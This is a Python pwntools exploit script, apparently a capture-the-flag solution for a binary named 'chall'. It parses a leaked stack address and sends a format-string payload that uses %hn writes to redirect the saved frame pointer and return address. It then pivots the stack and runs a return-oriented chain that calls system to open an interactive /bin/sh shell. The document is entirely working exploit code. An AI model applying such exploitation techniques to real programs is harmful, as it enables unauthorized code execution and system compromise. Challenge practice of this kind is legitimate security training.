from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
r = exe.process()
gdb.attach(r, api=True, gdbscript='''
        #    b*0x000000000040146c
            b*0x000000000040130a
           ''')

r.recvuntil(b'at ')
buf_addr = r.recv(14)
buf_addr = int(buf_addr, 16)
print(hex(buf_addr))
leave_ret = 0x000000000040130a
ret = 0x000000000040101a
pop_rdi = 0x0000000000401326
pop_rbp = 0x000000000040127d
binsh = buf_addr + 0x48

saverbp = buf_addr + 0x110
new_saverbp = buf_addr + 0x58
save_rip = saverbp + 8

check = (new_saverbp & 0xffff) - (leave_ret & 0xffff)

if check < 0:
    r.close()
    exit(0)

payload = f'%{leave_ret & 0xffff}c%18$hn%{(new_saverbp & 0xffff) - (leave_ret & 0xffff)}c%19$hn'.encode('utf-8').ljust(0x48, b'\x00') + b'/bin/sh\x00' + p64(save_rip) + p64(saverbp)
payload += flat(
    pop_rbp, 0,
    pop_rdi, exe.sym['binsh'],
    exe.plt['system']
)
r.sendlineafter(b'buffer: ', payload)

r.interactive()
